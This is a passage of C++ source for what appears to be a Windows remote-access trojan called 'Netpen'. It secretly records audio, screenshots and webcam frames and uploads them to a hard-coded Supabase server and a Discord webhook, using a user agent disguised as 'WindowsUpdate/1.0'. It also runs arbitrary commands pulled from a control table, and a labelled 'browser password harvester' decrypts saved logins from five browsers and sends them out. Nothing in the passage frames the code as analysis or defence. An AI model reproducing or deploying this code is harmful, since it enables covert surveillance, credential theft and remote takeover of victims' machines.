        hdr.sr = pMixFormat->nSamplesPerSec; hdr.br = pMixFormat->nAvgBytesPerSec;
        hdr.ba = pMixFormat->nBlockAlign; hdr.bps = pMixFormat->wBitsPerSample;
        hdr.dsz = 0; hdr.sz = 0;
        audioBuffer.insert(audioBuffer.end(), (BYTE*)&hdr, (BYTE*)&hdr + sizeof(hdr));
        if (FAILED(pClient->Start())) { CoTaskMemFree(pMixFormat); break; }
        DWORD startTime = GetTickCount();
        while (GetTickCount() - startTime < 10000) {
            UINT32 packets = 0;
            while (SUCCEEDED(pCapture->GetNextPacketSize(&packets)) && packets > 0) {
                BYTE* pData = NULL; UINT32 frames = 0; DWORD flags = 0;
                if (FAILED(pCapture->GetBuffer(&pData, &frames, &flags, NULL, NULL))) break;
                if (frames > 0 && !(flags & AUDCLNT_BUFFERFLAGS_SILENT))
                    audioBuffer.insert(audioBuffer.end(), pData, pData + frames * bytesPerFrame);
                else if (frames > 0)
                    audioBuffer.insert(audioBuffer.end(), frames * bytesPerFrame, 0);
                pCapture->ReleaseBuffer(frames);
            }
            if (packets == 0) Sleep(15);
        }
        pClient->Stop();
        CoTaskMemFree(pMixFormat);
        {
            size_t totalData = audioBuffer.size() - sizeof(hdr);
            WAVHDR* wh = (WAVHDR*)audioBuffer.data();
            wh->sz = (uint32_t)(totalData + sizeof(hdr) - 8);
            wh->dsz = (uint32_t)totalData;
        }
        HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written = 0;
            WriteFile(hFile, audioBuffer.data(), (DWORD)audioBuffer.size(), &written, NULL);
            CloseHandle(hFile);
            result = written == audioBuffer.size();
        }
    } while (false);
    if (pCapture) pCapture->Release();
    if (pClient) pClient->Release();
    if (pDevice) pDevice->Release();
    if (pEnum) pEnum->Release();
    CoUninitialize();
    return result;
}

static std::string GetScreenshotTimestamp() {
    time_t now = time(NULL);
    struct tm* tm = gmtime(&now);
    char buf[32] = {0};
    strftime(buf, sizeof(buf), "%Y%m%d_%H%M%S", tm);
    return std::string(buf);
}

static bool UploadToStorage(const std::string& localPath, const std::string& storagePath, const char* contentType) {
    HANDLE hFile = CreateFileA(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return false; }
    char* buf = new char[size];
    DWORD read = 0;
    if (!ReadFile(hFile, buf, size, &read, NULL) || read != size) { delete[] buf; CloseHandle(hFile); return false; }
    CloseHandle(hFile);

    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) { delete[] buf; return false; }
    WinHttpSetTimeouts(hSession, 30000, 30000, 30000, 30000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); delete[] buf; return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"PUT", ToWide(storagePath).c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); delete[] buf; return false; }

    std::wstring headers = L"apikey: " + g_supabaseServiceKey + L"\r\nAuthorization: Bearer " + g_supabaseServiceKey + L"\r\nContent-Type: " + ToWide(contentType) + L"\r\nx-upsert: true";

    bool ok = false;
    if (WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), buf, size, size, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD sc = 0, sl = sizeof(sc);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &sc, &sl, NULL);
            ok = (sc >= 200 && sc < 300);
        }
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    delete[] buf;
    return ok;
}

static std::string ExecuteCommand(const std::string& cmd, DWORD* outExitCode = NULL) {
    std::string result;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hStdOutRd, hStdOutWr;
    if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0)) { if (outExitCode) *outExitCode = -1; return ""; }
    SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdOutWr;
    si.hStdError = hStdOutWr;
    std::string cmdLine = "cmd.exe /c " + cmd;
    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    if (!CreateProcessA(NULL, &cmdLine[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, sysDir, &si, &pi)) {
        CloseHandle(hStdOutWr); CloseHandle(hStdOutRd);
        if (outExitCode) *outExitCode = -1;
        return "";
    }
    CloseHandle(hStdOutWr);
    DWORD startTime = GetTickCount();
    char buf[4096];
    while (true) {
        DWORD avail = 0;
        PeekNamedPipe(hStdOutRd, NULL, 0, NULL, &avail, NULL);
        if (avail > 0) {
            DWORD read = 0;
            DWORD toRead = avail < (DWORD)sizeof(buf)-1 ? avail : (DWORD)sizeof(buf)-1;
            if (ReadFile(hStdOutRd, buf, toRead, &read, NULL) && read > 0) {
                buf[read] = 0;
                result += buf;
                if (result.size() > 32000) { result = result.substr(0, 32000); result += "...[truncated]"; break; }
            }
        }
        DWORD waitResult = WaitForSingleObject(pi.hProcess, 200);
        if (waitResult == WAIT_OBJECT_0) break;
        if (waitResult == WAIT_TIMEOUT && GetTickCount() - startTime > 60000) {
            TerminateProcess(pi.hProcess, 1);
            result += "\n[timed out after 60s]";
            break;
        }
    }
    while (true) {
        DWORD avail = 0;
        PeekNamedPipe(hStdOutRd, NULL, 0, NULL, &avail, NULL);
        if (avail == 0) break;
        DWORD read = 0;
        DWORD toRead = avail < (DWORD)sizeof(buf)-1 ? avail : (DWORD)sizeof(buf)-1;
        if (ReadFile(hStdOutRd, buf, toRead, &read, NULL) && read > 0) {
            buf[read] = 0;
            result += buf;
            if (result.size() > 32000) break;
        }
    }
    CloseHandle(hStdOutRd);
    DWORD exitCode = -1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    if (outExitCode) *outExitCode = exitCode;
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return result;
}

static void CheckAndHandleExec() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.exec&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
    if (resp.size() < 10) return;
    std::string rowId = ExtractJSONNumber(resp, "id");
    std::string payload = ExtractJSONString(resp, "payload");
    if (rowId.empty() || payload.empty()) return;
    DWORD exitCode = 0;
    std::string output = ExecuteCommand(payload, &exitCode);
    if (output.empty()) output = "(no output)";
    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"" + EscapeJSON(payload) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":" + std::to_string((int)exitCode) + "}]";
    HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
    json = "{\"executed\":true}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
    LogMsg("Exec: " + payload + " -> exit " + std::to_string((int)exitCode));
}
 
// === Browser password harvester ===
 
#define SUPABASE_PASSWORDS_PATH L"/rest/v1/passwords"
 
static uint32_t SqliteVarint(const uint8_t* p, int* used) {
    uint32_t v = 0; *used = 0;
    for (int i = 0; i < 9; i++) {
        v = (v << 7) | (p[i] & 0x7F); (*used)++;
        if (!(p[i] & 0x80)) return v;
    }
    return v;
}
 
static uint16_t SqliteU16(const uint8_t* p) { return (uint16_t)(p[0] << 8) | p[1]; }
static uint32_t SqliteU32(const uint8_t* p) { return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3]; }
 
static const uint8_t* SqliteColumn(const uint8_t* payload, int payloadLen, int colIndex, int* outSize) {
    int used; uint32_t hdrSize = SqliteVarint(payload, &used);
    if (hdrSize > (uint32_t)payloadLen) return NULL;
    int pos = used, dataOff = (int)hdrSize;
    for (int i = 0; i <= colIndex; i++) {
        if ((uint32_t)pos >= hdrSize) return NULL;
        uint32_t st = SqliteVarint(payload + pos, &used); pos += used;
        int sz = 0;
        if (st == 1) sz = 1; else if (st == 2) sz = 2; else if (st == 3) sz = 3;
        else if (st == 4) sz = 4; else if (st == 5) sz = 6; else if (st == 6 || st == 7) sz = 8;
        else if (st >= 12 && st % 2 == 0) sz = (st - 12) / 2;
        else if (st >= 13) sz = (st - 13) / 2;
        if (i == colIndex) { if (st == 0 || st == 8 || st == 9 || sz == 0) { *outSize = 0; return NULL; } *outSize = sz; return payload + dataOff; }
        dataOff += sz;
    }
    return NULL;
}
 
static bool SqliteWalk(const uint8_t* db, size_t dbSize, uint16_t pageSize, int pageNum,
    bool (*cb)(int64_t rowid, const uint8_t* payload, int payloadLen, void* user), void* user)
{
    if ((size_t)((pageNum - 1) * pageSize + 8) > dbSize) return false;
    const uint8_t* page = db + (pageNum - 1) * pageSize;
    int type = page[0];
    if (type != 0x05 && type != 0x0D) return false;
    uint16_t count = SqliteU16(page + 3);
    if (type == 0x05) {
        for (uint16_t i = 0; i < count; i++) {
            uint16_t ptr = SqliteU16(page + pageSize - (i + 1) * 2);
            if (ptr + 4 > pageSize) continue;
            if (!SqliteWalk(db, dbSize, pageSize, (int)SqliteU32(page + ptr), cb, user)) return false;
        }
        return SqliteWalk(db, dbSize, pageSize, (int)SqliteU32(page + 8), cb, user);
    }
    for (uint16_t i = 0; i < count; i++) {
        uint16_t ptr = SqliteU16(page + pageSize - (i + 1) * 2);
        if (ptr + 2 > pageSize) continue;
        int used; SqliteVarint(page + ptr, &used);
        int ridUsed; uint64_t rowid = SqliteVarint(page + ptr + used, &ridUsed); used += ridUsed;
        if (used + 4 > pageSize - ptr) continue;
        if (!cb((int64_t)rowid, page + ptr + used, (int)(pageSize - ptr - used), user)) return false;
    }
    return true;
}
 
static int SqliteFindTableRoot(const uint8_t* db, size_t dbSize, uint16_t pageSize, const char* name) {
    struct Ctx { const char* name; int root; };
    Ctx ctx = { name, 0 };
    SqliteWalk(db, dbSize, pageSize, 1,
        [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
            auto* c = (Ctx*)u; int nLen;
            const uint8_t* tn = SqliteColumn(p, pl, 2, &nLen);
            if (tn && nLen > 0 && (int)strlen(c->name) == nLen && memcmp(tn, c->name, nLen) == 0) {
                int rLen; const uint8_t* rp = SqliteColumn(p, pl, 3, &rLen);
                if (rp && rLen > 0 && rLen <= 4) for (int b = 0; b < rLen; b++) c->root = (c->root << 8) | rp[b];
                return false;
            }
            return true;
        }, &ctx);
    return ctx.root;
}
 
static bool ChromeDecryptPassword(const uint8_t* key, int keyLen, const uint8_t* blob, int blobLen, const char* browser, const std::string& originUrl, std::string& out) {
    if (blobLen < 15 || blob[0] != 'v' || blob[1] != '1' || (blob[2] != '0' && blob[2] != '1')) { LogMsg(std::string(browser) + ": unsupported prefix '" + std::string((const char*)blob, blobLen > 3 ? 3 : blobLen) + "'"); return false; }
    const uint8_t* nonce = blob + 3;
    const uint8_t* ct = blob + 15;
    int ctLen = blobLen - 15 - 16;
    if (ctLen <= 0) return false;
    const uint8_t* tag = ct + ctLen;
 
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL; bool ok = false;
    ULONG ol = 0; DWORD tv = 16;
    if (FAILED(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return false;
    if (FAILED(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)L"ChainingModeGCM", (ULONG)(sizeof(L"ChainingModeGCM")), 0))) goto done;
    BCryptSetProperty(hAlg, BCRYPT_AUTH_TAG_LENGTH, (PUCHAR)&tv, sizeof(tv), 0);
    if (FAILED(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, keyLen, 0))) goto done;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = (PUCHAR)nonce; ai.cbNonce = 12; ai.pbTag = (PUCHAR)tag; ai.cbTag = 16;

    out.resize(ctLen + 32);
    if (SUCCEEDED(BCryptDecrypt(hKey, (PUCHAR)ct, ctLen, &ai, NULL, 0, (PUCHAR)out.data(), (ULONG)out.size(), &ol, 0))) {
        out.resize(ol);
        // Chrome 130+ (DB version 24+) prepends SHA256(origin_url) before encryption — strip it
        if (ol >= 32 && !originUrl.empty()) {
            BCRYPT_ALG_HANDLE hHash = NULL;
            BCRYPT_HASH_HANDLE hHashObj = NULL;
            DWORD hashLen = 0, tmp = 0;
            uint8_t expectedHash[32];
            if (SUCCEEDED(BCryptOpenAlgorithmProvider(&hHash, BCRYPT_SHA256_ALGORITHM, NULL, 0)) &&
                SUCCEEDED(BCryptGetProperty(hHash, BCRYPT_HASH_LENGTH, (PUCHAR)&hashLen, sizeof(hashLen), &tmp, 0)) &&
                hashLen == 32 &&
                SUCCEEDED(BCryptCreateHash(hHash, &hHashObj, NULL, 0, NULL, 0, 0)) &&
                SUCCEEDED(BCryptHashData(hHashObj, (PUCHAR)originUrl.c_str(), (ULONG)originUrl.size(), 0)) &&
                SUCCEEDED(BCryptFinishHash(hHashObj, expectedHash, 32, 0)) &&
                memcmp(out.data(), expectedHash, 32) == 0) {
                out.erase(0, 32);
                LogMsg(std::string(browser) + ": stripped SHA256 hash prefix");
            }
            if (hHashObj) BCryptDestroyHash(hHashObj);
            if (hHash) BCryptCloseAlgorithmProvider(hHash, 0);
        }
        ok = true;
    }
done:
    if (hKey) BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}
 
static const struct { const char* name; const char* ls; const char* ld; } kChromeBrowsers[] = {
    {"Chrome",  "\\Google\\Chrome\\User Data\\Local State",  "\\Google\\Chrome\\User Data\\Default\\Login Data"},
    {"Edge",    "\\Microsoft\\Edge\\User Data\\Local State",  "\\Microsoft\\Edge\\User Data\\Default\\Login Data"},
    {"Brave",   "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"},
    {"Opera",   "\\Opera Software\\Opera Stable\\Local State", "\\Opera Software\\Opera Stable\\Login Data"},
    {"Vivaldi", "\\Vivaldi\\User Data\\Local State",           "\\Vivaldi\\User Data\\Default\\Login Data"},
    {NULL, NULL, NULL}
};
 
static void HarvestBrowserPasswords() {
    char laBuf[MAX_PATH];
    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
    if (laLen == 0 || laLen >= MAX_PATH) return;
    std::string la(laBuf);
 
    for (int b = 0; kChromeBrowsers[b].name; b++) {
        std::string bName(kChromeBrowsers[b].name);
        // Read + decrypt AES key from Local State
        std::string lsPath = la + kChromeBrowsers[b].ls;
        HANDLE hLs = CreateFileA(lsPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hLs == INVALID_HANDLE_VALUE) { LogMsg(bName + ": Local State not found"); continue; }
        DWORD lsSize = GetFileSize(hLs, NULL);
        if (lsSize > 65536) { CloseHandle(hLs); LogMsg(bName + ": Local State too large"); continue; }
        std::string lsContent((size_t)lsSize, 0);
        DWORD rd = 0;
        if (!ReadFile(hLs, &lsContent[0], lsSize, &rd, NULL) || rd != lsSize) { CloseHandle(hLs); LogMsg(bName + ": Local State read failed"); continue; }
        CloseHandle(hLs);

        std::string encKeyStr = ExtractJSONString(lsContent, "encrypted_key");
        if (encKeyStr.empty()) { LogMsg(bName + ": encrypted_key not found in Local State"); continue; }

        // Base64 decode encrypted_key
        DWORD decLen = (DWORD)encKeyStr.size() * 3 / 4 + 16;
        std::vector<uint8_t> dec(decLen);
        if (!CryptStringToBinaryA(encKeyStr.c_str(), (DWORD)encKeyStr.size(), CRYPT_STRING_BASE64, dec.data(), &decLen, NULL, NULL)) { LogMsg(bName + ": base64 decode failed"); continue; }
        if (decLen <= 5) { LogMsg(bName + ": decrypted key too short"); continue; }

        // DPAPI decrypt to get AES key
        DATA_BLOB inBlob = { decLen - 5, dec.data() + 5 };
        DATA_BLOB outBlob = { 0, NULL };
        if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) { LogMsg(bName + ": DPAPI decrypt failed"); continue; }

        uint8_t aesKey[32];
        int keyLen = outBlob.cbData < 32 ? (int)outBlob.cbData : 32;
        memcpy(aesKey, outBlob.pbData, keyLen);
        LocalFree(outBlob.pbData);
        if (keyLen != 32) { LogMsg(bName + ": unexpected key length " + std::to_string(keyLen)); continue; }

        // Copy Login Data to temp
        std::string ldPath = la + kChromeBrowsers[b].ld;
        char tmpDir[MAX_PATH]; GetTempPathA(MAX_PATH, tmpDir);
        std::string tmpLd = std::string(tmpDir) + "NPLD_" + std::to_string(GetTickCount()) + ".tmp";
        if (!CopyFileA(ldPath.c_str(), tmpLd.c_str(), FALSE)) { LogMsg(bName + ": Login Data copy failed"); continue; }

        HANDLE hF = CreateFileA(tmpLd.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        HANDLE hM = NULL; const uint8_t* dbMap = NULL; size_t dbSz = 0;
        if (hF != INVALID_HANDLE_VALUE) { dbSz = GetFileSize(hF, NULL); if (dbSz > 100) { hM = CreateFileMapping(hF, NULL, PAGE_READONLY, 0, 0, NULL); if (hM) dbMap = (const uint8_t*)MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0); } }
        if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpLd.c_str()); LogMsg(bName + ": Login Data map failed"); continue; }

        int psInt = SqliteU16(dbMap + 16); if (psInt == 1) psInt = 65536; if (psInt < 512) psInt = 512; uint16_t ps = (uint16_t)psInt;

        int rootP = SqliteFindTableRoot(dbMap, dbSz, ps, "logins");
        if (rootP <= 0) { LogMsg(bName + ": logins table not found"); }
        if (rootP > 0) {
            struct HCtx { const uint8_t* db; size_t dbSz; uint16_t ps; uint8_t* ak; int kl; const char* bn; const char* hn; std::string batch; bool first; int count; };
            HCtx hc = { dbMap, dbSz, ps, aesKey, 32, kChromeBrowsers[b].name, g_hostname.c_str(), "[", true, 0 };
 
            SqliteWalk(dbMap, dbSz, ps, rootP, [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
                auto* h = (HCtx*)u; int urlL;
                const uint8_t* urlD = SqliteColumn(p, pl, 0, &urlL);
                if (!urlD || urlL <= 0) return true;
                std::string url((const char*)urlD, urlL);
                if (url.find("://") == std::string::npos || url.find("chrome://") == 0 || url.find("about:") == 0 || url.find("edge://") == 0 || url.find("brave://") == 0) return true;
 
                int usrL; const uint8_t* usrD = SqliteColumn(p, pl, 3, &usrL);
                if (!usrD || usrL <= 0) return true;
                std::string usr((const char*)usrD, usrL);
 
                int pwL; const uint8_t* pwD = SqliteColumn(p, pl, 5, &pwL);
                if (!pwD || pwL <= 15) return true;
 
                std::string pwd;
                if (!ChromeDecryptPassword(h->ak, h->kl, pwD, pwL, h->bn, url, pwd) || pwd.empty()) return true;
 
                std::string row = std::string(h->first ? "" : ",") + "{\"hostname\":\"" + EscapeJSON(h->hn) + "\",\"browser\":\"" + EscapeJSON(h->bn) + "\",\"origin_url\":\"" + EscapeJSON(url) + "\",\"username_value\":\"" + EscapeJSON(usr) + "\",\"password_value\":\"" + EscapeJSON(pwd) + "\"}";
                h->batch += row; h->first = false; h->count++;
                LogMsg(std::string(h->bn) + ": " + url + " / " + usr);
                return true;
            }, &hc);
 
            if (hc.count > 0) {
                hc.batch += "]";
                std::string pr;
                HttpRequest(L"POST", SUPABASE_PASSWORDS_PATH, hc.batch, pr);
                LogMsg(std::string(kChromeBrowsers[b].name) + ": " + std::to_string(hc.count) + " passwords uploaded");
            }
        }
 
        UnmapViewOfFile(dbMap);
        if (hM) CloseHandle(hM); if (hF) CloseHandle(hF);
        DeleteFileA(tmpLd.c_str());
    }
    LogMsg("Browser password harvest complete");
}
 
static std::string CheckScreenshotCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

static void HandleScreenshot(const std::string& rowId) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string ts = GetScreenshotTimestamp();
    std::string localFile = std::string(tmp) + "NetpenShot_" + g_hostname + "_" + ts + ".jpg";
    std::string storageFile = "screenshots/" + g_hostname + "_" + ts + ".jpg";

    if (!CaptureScreen(localFile.c_str())) { LogMsg("Screenshot: capture failed"); return; }
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
        LogMsg("Screenshot: upload failed");
        DeleteFileA(localFile.c_str());
        return;
    }

    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);

    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
    PostDiscordImage(host, "Netpen \u2014 " + host + " Screenshot", resultUrl, "");

    DeleteFileA(localFile.c_str());
    LogMsg("Screenshot done: " + resultUrl);
}

static std::string CheckWebcamCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.webcam&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

static void HandleWebcam(const std::string& rowId) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string ts = GetScreenshotTimestamp();
    std::string localFile = std::string(tmp) + "NetpenCam_" + g_hostname + "_" + ts + ".jpg";
    std::string storageFile = "webcam/" + g_hostname + "_" + ts + ".jpg";

    if (!CaptureWebcamFrame(localFile.c_str())) { LogMsg("Webcam: capture failed"); return; }
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
        LogMsg("Webcam: upload failed");
        DeleteFileA(localFile.c_str());
        return;
    }

    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);

    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
    PostDiscordImage(host, "Netpen \u2014 " + host + " Webcam", resultUrl, "");

    DeleteFileA(localFile.c_str());
    LogMsg("Webcam done: " + resultUrl);
}

static std::string CheckSpeakerCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.speaker&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

static void HandleSpeaker(const std::string& rowId) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string ts = GetScreenshotTimestamp();
    std::string localFile = std::string(tmp) + "NetpenAudio_" + g_hostname + "_" + ts + ".wav";
    std::string storageFile = "speaker/" + g_hostname + "_" + ts + ".wav";

    if (!CaptureSpeaker(localFile.c_str())) { LogMsg("Speaker: capture failed"); return; }
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    if (!UploadToStorage(localFile, storagePath, "audio/wav")) {
        LogMsg("Speaker: upload failed");
        DeleteFileA(localFile.c_str());
        return;
    }

    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);

    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
    PostDiscordImage(host, "Netpen \u2014 " + host + " Speaker Capture", resultUrl, "10s WAV audio capture. Download: " + resultUrl);

    DeleteFileA(localFile.c_str());
    LogMsg("Speaker done: " + resultUrl);
}

static void SendHeartbeat() {
    std::string json = "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"last_seen\":\"" + GetTimestamp() + "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}";
    std::string resp;
    std::wstring path = SUPABASE_HEARTBEAT_PATH + ToWide(g_hostname);
    HttpRequest(L"PUT", path.c_str(), json, resp);
}

static void FetchTriggers() {
    std::string resp;
    std::wstring q = L"/rest/v1/screenshot_triggers?active=eq.true&select=keyword";
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
    g_triggers.clear();
    size_t pos = 0;
    while (true) {
        size_t kp = resp.find("\"keyword\":\"", pos);
        if (kp == std::string::npos) break;
        kp += 11;
        size_t ke = resp.find("\"", kp);
        if (ke == std::string::npos) break;
        std::string kw = resp.substr(kp, ke - kp);
        if (!kw.empty()) g_triggers.push_back(kw);
        pos = ke + 1;
    }
}

static void PostDiscordImage(const std::string& host, const std::string& title, const std::string& imgUrl, const std::string& desc) {
    std::string payload = "{\"embeds\":[{\"title\":\"" + EscapeJSON(title) + "\",\"color\":3066993,\"description\":\"" + EscapeJSON(desc) + "\",\"image\":{\"url\":\"" + EscapeJSON(imgUrl) + "\"},\"timestamp\":\"" + GetTimestamp() + "\"}]}";
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
    std::wstring hdrs = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, hdrs.c_str(), hdrs.length(), (LPVOID)payload.c_str(), (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
}

static void CheckAutoScreenshot(const std::string& windowTitle) {
    if (windowTitle.empty() || g_triggers.empty()) return;
    DWORD now = GetTickCount();
    if (now - g_lastAutoScreenshot < 300000) return; // 5 min
    std::string lowerTitle;
    lowerTitle.resize(windowTitle.size());
    for (size_t i = 0; i < windowTitle.size(); i++) lowerTitle[i] = tolower(windowTitle[i]);

    for (size_t i = 0; i < g_triggers.size(); i++) {
        std::string kw = g_triggers[i];
        std::string lowerKw;
        lowerKw.resize(kw.size());
        for (size_t j = 0; j < kw.size(); j++) lowerKw[j] = tolower(kw[j]);
        if (lowerTitle.find(lowerKw) == std::string::npos) continue;

        g_lastAutoScreenshot = now;
        char tmp[MAX_PATH];
        GetTempPathA(MAX_PATH, tmp);
        std::string ts = GetScreenshotTimestamp();
        std::string localFile = std::string(tmp) + "NetpenAuto_" + g_hostname + "_" + ts + ".jpg";
        std::string storageFile = "auto_screenshots/" + g_hostname + "_" + ts + ".jpg";

        if (!CaptureScreen(localFile.c_str())) { LogMsg("AutoSS: capture failed"); break; }
        std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
        if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
            LogMsg("AutoSS: upload failed");
            DeleteFileA(localFile.c_str()); break;
        }
        std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
        std::string host = g_hostname.empty() ? "unknown" : g_hostname;
